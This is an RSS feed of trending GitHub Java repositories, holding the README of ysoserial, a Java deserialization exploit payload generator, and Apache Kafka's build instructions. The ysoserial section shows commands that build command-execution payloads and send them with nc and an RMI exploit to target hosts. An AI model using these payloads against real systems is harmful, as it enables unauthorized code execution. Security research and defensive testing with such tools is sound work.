<rss version="2.0">
  <channel>
    <title>GitHub Java Weekly Trending</title>
    <description>Weekly Trending of Java in GitHub</description>
    <pubDate>Wed, 23 Jul 2025 01:40:46 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>frohoff/ysoserial</title>
      <link>https://github.com/frohoff/ysoserial</link>
      <description>&lt;p&gt;A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ysoserial&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"&gt;&lt;img src="https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total" alt="GitHub release"&gt;&lt;/a&gt; &lt;a href="https://travis-ci.com/github/frohoff/ysoserial"&gt;&lt;img src="https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master" alt="Travis Build Status"&gt;&lt;/a&gt; &lt;a href="https://ci.appveyor.com/project/frohoff/ysoserial/branch/master"&gt;&lt;img src="https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true" alt="Appveyor Build status"&gt;&lt;/a&gt; &lt;a href="https://jitpack.io/#frohoff/ysoserial"&gt;&lt;img src="https://jitpack.io/v/frohoff/ysoserial.svg?sanitize=true" alt="JitPack"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/frohoff/ysoserial/master/ysoserial.png" alt="logo"&gt;&lt;/p&gt; 
&lt;h2&gt;Description&lt;/h2&gt; 
&lt;p&gt;Originally released as part of AppSecCali 2015 Talk &lt;a href="https://frohoff.github.io/appseccali-marshalling-pickles/"&gt;"Marshalling Pickles: how deserializing objects will ruin your day"&lt;/a&gt; with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x). Later updated to include additional gadget chains for &lt;a href="https://gist.github.com/frohoff/24af7913611f8406eaf3"&gt;JRE &amp;lt;= 1.7u21&lt;/a&gt; and several other libraries.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;ysoserial&lt;/strong&gt; is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing &lt;strong&gt;unsafe deserialization&lt;/strong&gt; of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.&lt;/p&gt; 
&lt;p&gt;It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.&lt;/p&gt; 
&lt;h2&gt;Disclaimer&lt;/h2&gt; 
&lt;p&gt;This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-shell"&gt;$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib&lt;span&gt;ğŸ«™&lt;/span&gt;jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Examples&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-shell"&gt;$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin
$ nc 10.10.10.10 1099 &amp;lt; groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"&gt;&lt;img src="https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total" alt="GitHub release"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Download the &lt;a href="https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"&gt;latest release jar&lt;/a&gt; from GitHub releases.&lt;/p&gt; 
&lt;h2&gt;Building&lt;/h2&gt; 
&lt;p&gt;Requires Java 1.7+ and Maven 3.x+&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;mvn clean package -DskipTests&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Code Status&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://travis-ci.com/github/frohoff/ysoserial"&gt;&lt;img src="https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master" alt="Build Status"&gt;&lt;/a&gt; &lt;a href="https://ci.appveyor.com/project/frohoff/ysoserial/branch/master"&gt;&lt;img src="https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true" alt="Build status"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Fork it&lt;/li&gt; 
 &lt;li&gt;Create your feature branch (&lt;code&gt;git checkout -b my-new-feature&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Commit your changes (&lt;code&gt;git commit -am 'Add some feature'&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Push to the branch (&lt;code&gt;git push origin my-new-feature&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Create new Pull Request&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;See Also&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet"&gt;Java-Deserialization-Cheat-Sheet&lt;/a&gt;: info on vulnerabilities, tools, blogs/write-ups, etc.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/frohoff/marshalsec"&gt;marshalsec&lt;/a&gt;: similar project for various Java deserialization formats/libraries&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/pwntester/ysoserial.net"&gt;ysoserial.net&lt;/a&gt;: similar project for .NET deserialization&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>apache/kafka</title>
      <link>https://github.com/apache/kafka</link>
      <description>&lt;p&gt;Mirror of Apache Kafka&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; 
 &lt;picture&gt; 
  &lt;source media="(prefers-color-scheme: light)" srcset="docs/images/kafka-logo-readme-light.svg"&gt; 
  &lt;source media="(prefers-color-scheme: dark)" srcset="docs/images/kafka-logo-readme-dark.svg"&gt; 
  &lt;img src="https://raw.githubusercontent.com/apache/kafka/trunk/docs/images/kafka-logo-readme-light.svg?sanitize=true" alt="Kafka Logo" width="50%"&gt; 
 &lt;/picture&gt; &lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/apache/kafka/actions/workflows/ci.yml?query=event%3Apush+branch%3Atrunk"&gt;&lt;img src="https://github.com/apache/kafka/actions/workflows/ci.yml/badge.svg?branch=trunk&amp;amp;event=push" alt="CI"&gt;&lt;/a&gt; &lt;a href="https://github.com/apache/kafka/actions/workflows/generate-reports.yml?query=event%3Aschedule+branch%3Atrunk"&gt;&lt;img src="https://github.com/apache/kafka/actions/workflows/generate-reports.yml/badge.svg?branch=trunk&amp;amp;event=schedule" alt="Flaky Test Report"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://kafka.apache.org"&gt;&lt;strong&gt;Apache Kafka&lt;/strong&gt;&lt;/a&gt; is an open-source distributed event streaming platform used by thousands of companies for high-performance data pipelines, streaming analytics, data integration, and mission-critical applications.&lt;/p&gt; 
&lt;p&gt;You need to have &lt;a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html"&gt;Java&lt;/a&gt; installed.&lt;/p&gt; 
&lt;p&gt;We build and test Apache Kafka with 17 and 23. The &lt;code&gt;release&lt;/code&gt; parameter in javac is set to &lt;code&gt;11&lt;/code&gt; for the clients and streams modules, and &lt;code&gt;17&lt;/code&gt; for the rest, ensuring compatibility with their respective minimum Java versions. Similarly, the &lt;code&gt;release&lt;/code&gt; parameter in scalac is set to &lt;code&gt;11&lt;/code&gt; for the streams modules and &lt;code&gt;17&lt;/code&gt; for the rest.&lt;/p&gt; 
&lt;p&gt;Scala 2.13 is the only supported version in Apache Kafka.&lt;/p&gt; 
&lt;h3&gt;Build a jar and run it&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew jar
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Follow instructions in &lt;a href="https://kafka.apache.org/quickstart"&gt;https://kafka.apache.org/quickstart&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Build source jar&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew srcJar
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Build aggregated javadoc&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew aggregatedJavadoc
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Build javadoc and scaladoc&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew javadoc
./gradlew javadocJar # builds a javadoc jar for each module
./gradlew scaladoc
./gradlew scaladocJar # builds a scaladoc jar for each module
./gradlew docsJar # builds both (if applicable) javadoc and scaladoc jars for each module
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Run unit/integration tests&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew test  # runs both unit and integration tests
./gradlew unitTest
./gradlew integrationTest
./gradlew test -Pkafka.test.run.flaky=true  # runs tests that are marked as flaky
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Force re-running tests without code change&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew test --rerun-tasks
./gradlew unitTest --rerun-tasks
./gradlew integrationTest --rerun-tasks
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Running a particular unit/integration test&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew clients:test --tests RequestResponseTest
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Repeatedly running a particular unit/integration test with specific times by setting N&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;N=500; I=0; while [ $I -lt $N ] &amp;amp;&amp;amp; ./gradlew clients:test --tests RequestResponseTest --rerun --fail-fast; do (( I=$I+1 )); echo "Completed run: $I"; sleep 1; done
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Running a particular test method within a unit/integration test&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew core:test --tests kafka.api.ProducerFailureHandlingTest.testCannotSendToInternalTopic
./gradlew clients:test --tests org.apache.kafka.clients.MetadataTest.testTimeToNextUpdate
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Running a particular unit/integration test with log4j output&lt;/h3&gt; 
&lt;p&gt;By default, there will be only small number of logs output while testing. You can adjust it by changing the &lt;code&gt;log4j2.yaml&lt;/code&gt; file in the module's &lt;code&gt;src/test/resources&lt;/code&gt; directory.&lt;/p&gt; 
&lt;p&gt;For example, if you want to see more logs for clients project tests, you can modify &lt;a href="https://github.com/apache/kafka/raw/trunk/clients/src/test/resources/log4j2.yaml#L35"&gt;the line&lt;/a&gt; in &lt;code&gt;clients/src/test/resources/log4j2.yaml&lt;/code&gt; to &lt;code&gt;level: INFO&lt;/code&gt; and then run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew cleanTest clients:test --tests NetworkClientTest   
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And you should see &lt;code&gt;INFO&lt;/code&gt; level logs in the file under the &lt;code&gt;clients/build/test-results/test&lt;/code&gt; directory.&lt;/p&gt; 
&lt;h3&gt;Specifying test retries&lt;/h3&gt; 
&lt;p&gt;Retries are disabled by default, but you can set maxTestRetryFailures and maxTestRetries to enable retries.&lt;/p&gt; 
&lt;p&gt;The following example declares -PmaxTestRetries=1 and -PmaxTestRetryFailures=3 to enable a failed test to be retried once, with a total retry limit of 3.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew test -PmaxTestRetries=1 -PmaxTestRetryFailures=3
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;a href="https://github.com/gradle/test-retry-gradle-plugin"&gt;Test Retry Gradle Plugin&lt;/a&gt; for and &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/.github/workflows/build.yml"&gt;build.yml&lt;/a&gt; more details.&lt;/p&gt; 
&lt;h3&gt;Generating test coverage reports&lt;/h3&gt; 
&lt;p&gt;Generate coverage reports for the whole project:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew reportCoverage -PenableTestCoverage=true -Dorg.gradle.parallel=false
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Generate coverage for a single module, i.e.:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew clients:reportCoverage -PenableTestCoverage=true -Dorg.gradle.parallel=false
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Building a binary release gzipped tar ball&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew clean releaseTarGz
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The release file can be found inside &lt;code&gt;./core/build/distributions/&lt;/code&gt;.&lt;/p&gt; 
&lt;h3&gt;Building auto generated messages&lt;/h3&gt; 
&lt;p&gt;Sometimes it is only necessary to rebuild the RPC auto-generated message data when switching between branches, as they could fail due to code changes. You can just run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew processMessages processTestMessages
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/clients/src/main/resources/common/message/README.md"&gt;Apache Kafka Message Definitions&lt;/a&gt; for details on Apache Kafka message protocol.&lt;/p&gt; 
&lt;h3&gt;Running a Kafka broker&lt;/h3&gt; 
&lt;p&gt;Using compiled files:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;KAFKA_CLUSTER_ID="$(./bin/kafka-storage.sh random-uuid)"
./bin/kafka-storage.sh format --standalone -t $KAFKA_CLUSTER_ID -c config/server.properties
./bin/kafka-server-start.sh config/server.properties
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Using docker image:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 9092:9092 apache/kafka:latest
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/docker/README.md"&gt;docker/README.md&lt;/a&gt; for detailed information.&lt;/p&gt; 
&lt;h3&gt;Cleaning the build&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew clean
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Running a task for a specific project&lt;/h3&gt; 
&lt;p&gt;This is for &lt;code&gt;core&lt;/code&gt;, &lt;code&gt;examples&lt;/code&gt; and &lt;code&gt;clients&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew core:jar
./gradlew core:test
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Streams has multiple sub-projects, but you can run all the tests:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew :streams:testAll
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Listing all gradle tasks&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew tasks
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Building IDE project&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Note Please ensure that JDK17 is used when developing Kafka.&lt;/em&gt;&lt;/p&gt; 
&lt;p&gt;IntelliJ supports Gradle natively and it will automatically check Java syntax and compatibility for each module, even if the Java version shown in the &lt;code&gt;Structure &amp;gt; Project Settings &amp;gt; Modules&lt;/code&gt; may not be the correct one.&lt;/p&gt; 
&lt;p&gt;When it comes to Eclipse, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew eclipse
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;eclipse&lt;/code&gt; task has been configured to use &lt;code&gt;${project_dir}/build_eclipse&lt;/code&gt; as Eclipse's build directory. Eclipse's default build directory (&lt;code&gt;${project_dir}/bin&lt;/code&gt;) clashes with Kafka's scripts directory and we don't use Gradle's build directory to avoid known issues with this configuration.&lt;/p&gt; 
&lt;h3&gt;Publishing the streams quickstart archetype artifact to maven&lt;/h3&gt; 
&lt;p&gt;For the Streams archetype project, one cannot use gradle to upload to maven; instead the &lt;code&gt;mvn deploy&lt;/code&gt; command needs to be called at the quickstart folder:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;cd streams/quickstart
mvn deploy
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please note for this to work you should create/update user maven settings (typically, &lt;code&gt;${USER_HOME}/.m2/settings.xml&lt;/code&gt;) to assign the following variables&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;&amp;lt;settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0
                       https://maven.apache.org/xsd/settings-1.0.0.xsd"&amp;gt;
...                           
&amp;lt;servers&amp;gt;
   ...
   &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;apache.snapshots.https&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;${maven_username}&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;${maven_password}&amp;lt;/password&amp;gt;
   &amp;lt;/server&amp;gt;
   &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;apache.releases.https&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;${maven_username}&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;${maven_password}&amp;lt;/password&amp;gt;
    &amp;lt;/server&amp;gt;
    ...
 &amp;lt;/servers&amp;gt;
 ...
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Installing all projects to the local Maven repository&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew -PskipSigning=true publishToMavenLocal
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Installing specific projects to the local Maven repository&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew -PskipSigning=true :streams:publishToMavenLocal
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Building the test jar&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew testJar
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Running code quality checks&lt;/h3&gt; 
&lt;p&gt;There are two code quality analysis tools that we regularly run, spotbugs and checkstyle.&lt;/p&gt; 
&lt;h4&gt;Checkstyle&lt;/h4&gt; 
&lt;p&gt;Checkstyle enforces a consistent coding style in Kafka. You can run checkstyle using:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew checkstyleMain checkstyleTest spotlessCheck
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The checkstyle warnings will be found in &lt;code&gt;reports/checkstyle/reports/main.html&lt;/code&gt; and &lt;code&gt;reports/checkstyle/reports/test.html&lt;/code&gt; files in the subproject build directories. They are also printed to the console. The build will fail if Checkstyle fails. For experiments (or regression testing purposes) add &lt;code&gt;-PcheckstyleVersion=X.y.z&lt;/code&gt; switch (to override project-defined checkstyle version).&lt;/p&gt; 
&lt;h4&gt;Spotless&lt;/h4&gt; 
&lt;p&gt;The import order is a part of static check. please call &lt;code&gt;spotlessApply&lt;/code&gt; to optimize the imports of Java codes before filing pull request.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew spotlessApply
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Spotbugs&lt;/h4&gt; 
&lt;p&gt;Spotbugs uses static analysis to look for bugs in the code. You can run spotbugs using:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew spotbugsMain spotbugsTest -x test
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The spotbugs warnings will be found in &lt;code&gt;reports/spotbugs/main.html&lt;/code&gt; and &lt;code&gt;reports/spotbugs/test.html&lt;/code&gt; files in the subproject build directories. Use -PxmlSpotBugsReport=true to generate an XML report instead of an HTML one.&lt;/p&gt; 
&lt;h3&gt;JMH microbenchmarks&lt;/h3&gt; 
&lt;p&gt;We use &lt;a href="https://openjdk.java.net/projects/code-tools/jmh/"&gt;JMH&lt;/a&gt; to write microbenchmarks that produce reliable results in the JVM.&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://github.com/apache/kafka/raw/trunk/jmh-benchmarks/README.md"&gt;jmh-benchmarks/README.md&lt;/a&gt; for details on how to run the microbenchmarks.&lt;/p&gt; 
&lt;h3&gt;Dependency Analysis&lt;/h3&gt; 
&lt;p&gt;The gradle &lt;a href="https://docs.gradle.org/current/userguide/viewing_debugging_dependencies.html"&gt;dependency debugging documentation&lt;/a&gt; mentions using the &lt;code&gt;dependencies&lt;/code&gt; or &lt;code&gt;dependencyInsight&lt;/code&gt; tasks to debug dependencies for the root project or individual subprojects.&lt;/p&gt; 
&lt;p&gt;Alternatively, use the &lt;code&gt;allDeps&lt;/code&gt; or &lt;code&gt;allDepInsight&lt;/code&gt; tasks for recursively iterating through all subprojects:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew allDeps

./gradlew allDepInsight --configuration runtimeClasspath --dependency com.fasterxml.jackson.core:jackson-databind
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;These take the same arguments as the builtin variants.&lt;/p&gt; 
&lt;h3&gt;Determining if any dependencies could be updated&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;./gradlew dependencyUpdates
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Common build options&lt;/h3&gt; 
&lt;p&gt;The following options should be set with a &lt;code&gt;-P&lt;/code&gt; switch, for example &lt;code&gt;./gradlew -PmaxParallelForks=1 test&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;commitId&lt;/code&gt;: sets the build commit ID as .git/HEAD might not be correct if there are local commits added for build purposes.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;mavenUrl&lt;/code&gt;: sets the URL of the maven deployment repository (&lt;code&gt;file://path/to/repo&lt;/code&gt; can be used to point to a local repository).&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;maxParallelForks&lt;/code&gt;: maximum number of test processes to start in parallel. Defaults to the number of processors available to the JVM.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;maxScalacThreads&lt;/code&gt;: maximum number of worker threads for the scalac backend. Defaults to the lowest of &lt;code&gt;8&lt;/code&gt; and the number of processors available to the JVM. The value must be between 1 and 16 (inclusive).&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ignoreFailures&lt;/code&gt;: ignore test failures from junit&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;showStandardStreams&lt;/code&gt;: shows standard out and standard error of the test JVM(s) on the console.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;skipSigning&lt;/code&gt;: skips signing of artifacts.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;testLoggingEvents&lt;/code&gt;: unit test events to be logged, separated by comma. For example &lt;code&gt;./gradlew -PtestLoggingEvents=started,passed,skipped,failed test&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;xmlSpotBugsReport&lt;/code&gt;: enable XML reports for spotBugs. This also disables HTML reports as only one can be enabled at a time.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;maxTestRetries&lt;/code&gt;: maximum number of retries for a failing test case.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;maxTestRetryFailures&lt;/code&gt;: maximum number of test failures before retrying is disabled for subsequent tests.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;enableTestCoverage&lt;/code&gt;: enables test coverage plugins and tasks, including bytecode enhancement of classes required to track said coverage. Note that this introduces some overhead when running tests and hence why it's disabled by default (the overhead varies, but 15-20% is a reasonable estimate).&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;keepAliveMode&lt;/code&gt;: configures the keep alive mode for the Gradle compilation daemon - reuse improves start-up time. The values should be one of &lt;code&gt;daemon&lt;/code&gt; or &lt;code&gt;session&lt;/code&gt; (the default is &lt;code&gt;daemon&lt;/code&gt;). &lt;code&gt;daemon&lt;/code&gt; keeps the daemon alive until it's explicitly stopped while &lt;code&gt;session&lt;/code&gt; keeps it alive until the end of the build session. This currently only affects the Scala compiler, see &lt;a href="https://github.com/gradle/gradle/pull/21034"&gt;https://github.com/gradle/gradle/pull/21034&lt;/a&gt; for a PR that attempts to do the same for the Java compiler.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;scalaOptimizerMode&lt;/code&gt;: configures the optimizing behavior of the scala compiler, the value should be one of &lt;code&gt;none&lt;/code&gt;, &lt;code&gt;method&lt;/code&gt;, &lt;code&gt;inline-kafka&lt;/code&gt; or &lt;code&gt;inline-scala&lt;/code&gt; (the default is &lt;code&gt;inline-kafka&lt;/code&gt;). &lt;code&gt;none&lt;/code&gt; is the scala compiler default, which only eliminates unreachable code. &lt;code&gt;method&lt;/code&gt; also includes method-local optimizations. &lt;code&gt;inline-kafka&lt;/code&gt; adds inlining of methods within the kafka packages. Finally, &lt;code&gt;inline-scala&lt;/code&gt; also includes inlining of methods within the scala library (which avoids lambda allocations for methods like &lt;code&gt;Option.exists&lt;/code&gt;). &lt;code&gt;inline-scala&lt;/code&gt; is only safe if the Scala library version is the same at compile time and runtime. Since we cannot guarantee this for all cases (for example, users may depend on the kafka jar for integration tests where they may include a scala library with a different version), we don't enable it by default. See &lt;a href="https://www.lightbend.com/blog/scala-inliner-optimizer"&gt;https://www.lightbend.com/blog/scala-inliner-optimizer&lt;/a&gt; for more details.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Running system tests&lt;/h3&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/tests/README.md"&gt;tests/README.md&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Using Trogdor for testing&lt;/h3&gt; 
&lt;p&gt;We use Trogdor as a test framework for Apache Kafka. You can use it to run benchmarks and other workloads.&lt;/p&gt; 
